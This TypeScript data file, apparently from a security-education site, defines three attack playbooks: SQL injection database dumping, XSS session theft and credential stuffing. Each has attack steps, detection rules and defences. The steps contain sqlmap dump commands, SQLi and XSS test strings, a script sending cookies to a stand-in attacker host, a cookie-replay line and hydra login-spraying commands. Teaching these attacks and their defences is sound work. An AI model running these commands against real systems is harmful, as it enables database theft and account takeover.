import type { AttackPlaybook } from "../types";

export const ATTACK_PLAYBOOKS_3: AttackPlaybook[] = [
  {
    slug: "sqli-data-dump",
    title: "SQL injection — dumping a database",
    icon: "💾",
    category: "web",
    summary:
      "A login form or search box passes user input straight into a SQL query. The attacker sends crafted fragments that bend the query to their will — reading, then dumping, the whole database.",
    target: "Any app with a user-input → database path that failed to parameterise its queries.",
    impact:
      "Users, hashed passwords, orders, tokens, secrets — the full database, downloaded in minutes once one parameter is injectable.",
    tools: ["sqlmap", "burpsuite", "nmap", "seclists", "wireshark"],
    introMd: `SQL is the language databases speak. When an app builds a query with string concatenation —

\`\`\`sql
SELECT * FROM users WHERE email = 'user input here' AND pass = '...'
\`\`\`

— the *input* gets to act as *code*. A single quote closes the string, and the rest of the input becomes query logic.

The classic minimax:

- **Error-based / union-based**: the page leaks DB errors or joins results, so the attacker queries the schema *through the browser*.
- **Boolean / time blind**: no output, but the site behaves differently ("Welcome"/"No" or slow/fast) — the attacker infers data one character at a time.

\`sqlmap\` automates all of it.

> Scope: only apps you own, or targets in writing.

\`\`\`bash
sqlmap -u 'https://target.example/item?id=1' --batch --dump
\`\`\``,
    steps: [
      {
        title: "Find the injectable parameter",
        md: `Recon first: which inputs touch the database?

- Every **id=, search=, user=, sort=** parameter on pages that filter/order.
- **POST bodies** in login and search forms (\`burpsuite\` proxy captures them).
- Anything the app uses to look things up.

Test — send a single quote and a boolean change:

\`\`\`text
item?id=1'          -> error page or malformed SQL = likely injectable
item?id=1 AND 1=1   -> behaves normal (true)
item?id=1 AND 1=2   -> empty/error (false-condition)  = injection confirmed
\`\`\`

The tell: the app reacts differently to *true* vs *false*, while both are valid-looking input.

(Small-lab warning: only blast \`sqlmap\` on your own test instance — hammering a live DB with \`--dump\` can be noticed even legally.)`,
      },
      {
        title: "Map the schema",
        md: `Once injectable, \`sqlmap\` enumerates structure:

\`\`\`bash
sqlmap -u 'https://target.example/item?id=1' --dbs          # databases
sqlmap -u 'https://target.example/item?id=1' -D appdb --tables
sqlmap -u 'https://target.example/item?id=1' -D appdb -T users --columns
\`\`\`

The attacker learns table names, then picks the high-value ones: \`users\`, \`orders\`, \`sessions\`, \`tokens\`.

\*_\`--technique=B\` narrows to blind-boolean when the target blocks union errors.

Blind queries pause per-second, so attackers batch big reads.

(On a real pentest the client wants this *reported*, not silently dumped.)`,
      },
      {
        title: "Export the prize",
        md: `\`\`\`bash
sqlmap -u 'https://target.example/item?id=1' -D appdb -T users --dump
\`\`\`

The dump arrives CSV-friendly with rows like: email, username, \`bcrypt\$/sha1\` hash, staff role.

Then the chain continues:

- **Crack the hashes** (\`hashcat\`, \`john\`) — weak ones fall fast.
- **Stuff the passwords** across other sites (credential stuffing playbook).
- **Escalate**: one \`admin\` role row upgrades the attacker's session.

A single injectable parameter routinely yields the whole account store.

(The ethical lane: your training DB, your own lab app, or a written-scope asset.)`,
      },
    ],
    detectionMd: `- **WAF/IDS signals**: query strings containing \`'\`, \`OR 1=1\`, \`UNION SELECT\`, \`AND 1=1\` — the most classic signature.
- **Error pages that mention SQL** = the app leaking internals; a patchable symptom that attackers use.
- **Latency spikes** on DB-backed endpoints: time-based blind scans stretch requests by design.
- **Outlier database reads**: a table accessed from an unusual source IP goes from zero to massive.

\`\`\`text
# typical IDS rule shape:
alert any any -> any any (msg:"SQLi — UNION select"; content:"UNION SELECT"; nocase;)
\`\`\``,
    defenseMd: `1. **Parameterised queries / prepared statements, everywhere.** Never concatenate input into SQL — the single change that kills 99% of this class.
2. **ORM/driver placeholders** as the default habits (\`?1\`, \`%s\`, \`@param\`, etc.).
3. **Least privilege DBs** — the web user cannot \`SELECT\` arbitrary tables.
4. **WAF + input validation** as defence-in-depth, not replacement.
5. **Never put errors in the response**; log them server-side.

SQLi is the granddaddy web bug — parameterising is the whole cure.

(If you're testing, \`sqlmap\` on a *lab* instance is how you learn the signatures your WAF should watch for.)`,
  },
  {
    slug: "xss-session-theft",
    title: "XSS — stealing sessions through the browser",
    icon: "🧩",
    category: "web",
    summary:
      "The app echoes user input back into a page without escaping it. The attacker injects a script that runs in every visitor's browser — reading cookies, keys and pages as if it were the victim.",
    target: "Any site that renders user content unescaped: forums, comments, dashboards, search results.",
    impact:
      "Session cookies exfiltrated, keystrokes captured, pages rewritten in the victim's own browser — a foothold into every account that visits the poisoned page.",
    tools: ["xsser", "burpsuite", "beef", "wireshark", "evilginx"],
    introMd: `Reflected XSS in one sentence: the app prints what you typed, so if you type \`<script>\`, the browser *runs* it.

**Cached-in-the-URL (reflected)**: the payload lives in the link — the attacker sends the victim a poisoned URL.

**Stored**: the payload lives in the database — *every* visitor to the page gets hit.

**DOM-based**: the payload never touches the server — it manipulates the page's own JavaScript.

> Defence-first framing: only test your own apps.

The session steal in three moves.

\`\`\`bash
xsser --url 'https://target.example/search?q=HACK' --Fp "<script>...</script>"
\`\`\``,
    steps: [
      {
        title: "Find where input lands unescaped",
        md: `The hunt: submit \`<script>alert(1)</script>\` everywhere user input is echoed.

- **Search fields** that reflect the query back ("Results for… ").
- **Comments/reviews/profile** fields (stored route).
- **URL parameters** carried into the page's JS.

\`xsser\` automates dozens of payload variants (breaking out of \`value="…"\`, \`onerror=\` attributes, etc.) and \`burpsuite\` shows exactly where the payload gets rendered.

The verdict: any place the browser treats attacker text as markup.

(Your lab: local test apps under /dev, or a deliberately-vulnerable VM.)`,
      },
      {
        title: "Weaponise: the real payload",
        md: `The demo payload alerts; the real one *behaves*.

\`\`\`js
// victim's browser sends the session cookie to the attacker
fetch('https://attacker.example/c?c=' + document.cookie)
\`\`\`

Popular live payloads:

- **Cookie/header exfil** — the classic.
- **Keystroke logger** injected into the page.
- **Form-field pillage** — reads what the victim types on *every* page.
- **Keylogging over \`beef\`** — the Browser Exploitation Framework turns the victim's browser into a networked agent.

\`\`\`bash
# beef gives a control panel for hooked browsers:
# injected JS calls home and the attacker issues commands live
\`\`\`

If the site uses \`HttpOnly\` cookies, the session fix becomes a browser-side \`<script>\` that rides the *authenticated* context anyway.

(Reading \`HttpOnly\` fails; attacking the page the victim *is logged into* doesn't.)`,
      },
      {
        title: "Deliver and escalate",
        md: `Delivery:

- **Reflected**: a poisoned link in email/SMS/chat — the payload fires when the victim opens the URL.
- **Stored**: just wait on the comment/profile page.

What it buys:

- **Session takeover**: replay the stolen cookie into the attacker's browser.
- **Account pivot**: with one session, enumerate the victim's internal pages, reset passwords, spread.

\`\`\`bash
# cookie replay in a browser devtool:
document.cookie = "sessionid=<stolen>; domain=target.example"
\`\`\`

One unescaped output point plus one riding logged-in victim adds up to a full account.

(Detection guidance exists because defenders have to catch this very payload.)`,
      },
    ],
    detectionMd: `- **WAF signals**: \`<script>\`, \`onerror=\`, \`javascript:\`, \`<img src=x onerror>\` in requests.
- **HTTP-only is not enough**: watch for \`fetch('\`-style beacons to unknown domains from the visitor's browser.
- **Outbound POSTs from a page you didn't write** — the exfil hook in action.
- **CSP alerts**: a Content-Security-Policy that fires on the injected script.

\`\`\`text
# beacon shape an NDR flags: browser page making an unusual outbound post on load
\`\`\``,
    defenseMd: `1. **Escape output at the render layer** — every framework's auto-escaping ON. That single default kills reflected+stored XSS.
2. **Content-Security-Policy** — \`script-src 'self'\` blocks injected inline scripts by policy.
3. **HttpOnly + Secure** on session cookies (defends the classic steal; not the page-riding variant).
4. **Sanitise only-as-input**: validate input, but the *protection* lives in escaping on the way out.
5. **Modern framework defaults** (React/Next auto-escape JSX/Vapor) already do most of this.

The core loop for the defender: everything echoed must be neutralised.

(Test with \`xsser\` on your own app; the same signatures your WAF writes catch attackers.)`,
  },
  {
    slug: "credential-stuffing-spray",
    title: "Credential stuffing & password spraying",
    icon: "🧺",
    category: "web",
    summary:
      "Millions of leaked username/password pairs are replayed against site A to see which still work — or one likely password is tried across every account, because people reuse.",
    target: "Any service with an account: banks, shops, SaaS, VPNs, school portals.",
    impact:
      "Full account takeover on whichever service the victim reused a password on — inboxes, payments, admin dashboards.",
    tools: ["hydra", "patator", "seclists", "burpsuite", "wordlists", "metasploit"],
    introMd: `Passwords leak in bulk — then attackers replay them.

- **Credential stuffing**: take leaked \`email:password\` pairs, throw them at many sites at once. Success rate is low per hit but *massive* in volume — people reuse passwords.

- **Password spraying**: pick one high-probability password (\`Spring#2024\`, \`CompanySummer!\`) and try it against *every* account — zero lockouts, low per-account odds, huge breadth.

Both are automation problems.

> Authorised testing only.

\`\`\`bash
# stuffing one list against an API login:
hydra -l victim@example.com -P leaked.txt target.example https-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
\`\`\``,
    steps: [
      {
        title: "Gather the fuel",
        md: `The "fuel" is leaked data (public breach dumps, paste sites) cleaned into \`email:pass\` pairs, plus the target's own credentials.

Attackers enrich: breach payloads + the site's known password policies → tuned password guesses.

\`\`\`bash
# password generation for the target org:
sed -n '1,200p' /usr/share/wordlists/rockyou.txt > sample.txt   # quick head starts
\`\`\`

The more the attacker knows about the *place* (year, slogans, employee naming), the better the spray.

(For your lab: your own test accounts and a private API.)`,
      },
      {
        title: "Automate the replay low-and-slow",
        md: `The failure modes matter: lockouts, rate limits, CAPTCHAs.

Smart attackers:

- **Rotate lists** so a single \`Locked\` doesn't kill progress.
- **Slow the spray**: a few requests/minute across *many* accounts — undetectable by lockout logic.
- **Mimic the app's own login flow** (headers, tokens) so the request body and timing look human.

\`\`\`bash
hydra -L emails.txt -P passwords.txt target.example https-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid username or password"
# every "not F" answer = a winner
\`\`\`

\`patator\`, \`medusa\`, \`ncrack\` and \`burpsuite\` Intruder are the same engine.

(The defensive rule — per-account rate limits + time locks — is exactly what this dodges.)`,
      },
      {
        title: "Turn one hit into full access",
        md: `A single valid login is rarely the end.

- **Dashboard numbers**: the attacker inventories what the session can reach.
- **Password reset from inside** — easier than guessing another password.
- **Pivot**: the same creds at other services (most users reuse across 2-3 sites).
- **Session expansion**: with one account, escalate privileges, steal user data.

A successful spray converts a one-line dump into a *working login*.

(The lab lesson: every service you own gets the same fix — never let one dump buy entry anywhere.)`,
      },
    ],
    detectionMd: `- **Unusual auth volume**: many logins for many usernames from few IPs = spray; the inverse (many passwords, one user) = stuffing.
- **Login success followed by unusual behaviour** — new device, changed settings, immediate data export.
- **Slow-and-low traits**: odd inter-request timing, repeated \`User-Agent\`/fingerprint from one source.
- **Geo anomalies**: a Ukrainian public IP logging into a user who logs in from Berlin.

\`\`\`text
# SIEM query shape:
auth.login where count(distinct username) > 30 per source-ip in 15 min
\`\`\``,
    defenseMd: `1. **Password managers + unique passwords** everywhere — the only true cure (a leaked pair that works nowhere is dead fuel).
2. **MFA on every account**: a leaked password with 2FA changes the game completely.
3. **Per-account lockouts + throttling**: IP-based rate limits, time locks after N tries.
4. **Breach-credential monitoring**: alert when an owned credential appears in a public dump (haveibeenpwned-style).
5. **No password reuse between work and personal**.

The whole defense distills: unique passwords + 2FA.

(A stuffed password is harmless if it opens only a dead door.)`,
  },
];